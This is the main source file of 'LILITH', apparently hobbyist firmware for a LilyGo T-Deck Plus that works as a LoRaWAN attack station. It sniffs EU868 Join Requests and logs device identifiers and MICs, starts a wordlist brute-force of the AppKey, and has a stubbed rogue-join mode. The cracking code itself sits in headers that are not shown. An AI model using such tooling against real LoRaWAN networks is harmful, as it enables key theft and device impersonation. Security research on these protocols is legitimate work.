/*
 * LILITH — LilyGo T-Deck Plus LoRaWAN Attack Station
 *
 * Modes:
 *   [S] Sniff   — passive EU868 listener, catches Join Requests
 *   [C] Crack   — on-device AES-128-CMAC wordlist brute-force
 *   [J] Rogue   — Rogue Join with cracked AppKey (stub)
 *   [D] Detect  — log all LoRaWAN traffic
 */

#include "config.h"
#include "lorawan.h"
#include "cracker.h"
#include "sniffer.h"
#include "ui.h"

// -- state machine ---------------------------------------------------------

enum AppState { ST_MENU, ST_SNIFF, ST_CRACK, ST_ROGUE, ST_DETECT };

static AppState    g_state    = ST_MENU;
static JoinRequest g_last_jr;
static bool        g_jr_valid = false;
static CrackResult g_crack;
static uint32_t    g_detect_count = 0;
static bool        g_radio_ok = false;
static uint32_t    g_stat_ts  = 0;

// -- radio lazy init -------------------------------------------------------

static bool ensure_radio() {
    if (g_radio_ok) return true;
    ui_radio_init_start();
    g_radio_ok = sniffer_init();
    if (!g_radio_ok) {
        Serial.println("[lilith] radio FAILED");
    } else {
        Serial.println("[lilith] radio ok");
    }
    ui_status_tick();   // restore normal status bar
    return g_radio_ok;
}

// -- helpers ---------------------------------------------------------------

static void goto_state(AppState s) {
    g_state = s;
    switch (s) {
        case ST_MENU:
            if (g_radio_ok) sniffer_sleep();
            ui_show_menu();
            break;

        case ST_SNIFF:
            ui_show_sniff(g_sniff_ch, g_sniff_sf);
            if (!ensure_radio()) {
                ui_show_error("Radio init sikertelen.");
                g_state = ST_MENU;
            }
            break;

        case ST_CRACK:
            if (!g_jr_valid) {
                ui_show_error("Nincs Join Request. Elobb [S] Sniff.");
                g_state = ST_MENU;
                break;
            }
            ui_show_crack(0);
            g_crack = cracker_run(&g_last_jr);
            ui_show_crack_result(&g_crack);
            break;

        case ST_ROGUE:
            if (g_radio_ok) sniffer_sleep();
            ui_show_rogue();
            break;

        case ST_DETECT:
            g_detect_count = 0;
            ui_show_detect(0);
            if (!ensure_radio()) {
                ui_show_error("Radio init sikertelen.");
                g_state = ST_MENU;
            }
            break;
    }
}

// -- setup / loop ----------------------------------------------------------

void setup() {
    Serial.begin(115200);
    delay(500);
    Serial.println("[lilith] boot");

    ui_init();
    Serial.println("[lilith] display ok");

    ui_show_menu();
    // Radio is NOT initialized here — lazy init on first sniff/detect
}

void loop() {
    if (millis() - g_stat_ts >= 2000) {
        g_stat_ts = millis();
        ui_status_tick();
    }

    uint8_t key = ui_read_key();

    if (key == 27 || key == 8) {
        goto_state(ST_MENU);
        return;
    }

    switch (g_state) {

        case ST_MENU:
            if      (key == 's' || key == 'S') goto_state(ST_SNIFF);
            else if (key == 'c' || key == 'C') goto_state(ST_CRACK);
            else if (key == 'j' || key == 'J') goto_state(ST_ROGUE);
            else if (key == 'd' || key == 'D') goto_state(ST_DETECT);
            break;

        case ST_SNIFF: {
            if (!g_radio_ok) break;
            JoinRequest jr;
            if (sniffer_tick(&jr)) {
                g_last_jr  = jr;
                g_jr_valid = true;
                ui_update_sniff_packet(&jr);
                ui_lora_packet_seen(sniffer_snr(), sniffer_rssi());
                char hex[33];
                bytes_to_hex(jr.app_eui,   8, hex); Serial.printf("AppEUI: %s\n", hex);
                bytes_to_hex(jr.dev_eui,   8, hex); Serial.printf("DevEUI: %s\n", hex);
                bytes_to_hex(jr.dev_nonce, 2, hex); Serial.printf("Nonce:  %s\n", hex);
                bytes_to_hex(jr.mic,       4, hex); Serial.printf("MIC:    %s\n", hex);
            } else {
                static uint8_t last_ch = 255;
                if (g_sniff_ch != last_ch) {
                    last_ch = g_sniff_ch;
                    char buf[32];
                    snprintf(buf, sizeof(buf), "%.1f MHz  SF%d",
                             EU868_FREQS[g_sniff_ch], g_sniff_sf);
                    ui_refresh_channel(buf);
                }
            }
            if (key == 'c' || key == 'C') goto_state(ST_CRACK);
            break;
        }

        case ST_CRACK:
            break;

        case ST_ROGUE:
            break;

        case ST_DETECT: {
            if (!g_radio_ok) break;
            JoinRequest jr;
            if (sniffer_tick(&jr)) {
                g_detect_count++;
                char hex[33];
                bytes_to_hex(jr.dev_eui, 8, hex);
                Serial.printf("[detect] #%lu JR DevEUI=%s\n",
                              (unsigned long)g_detect_count, hex);
                ui_detect_update_count(g_detect_count);
            }
            break;
        }
    }
}
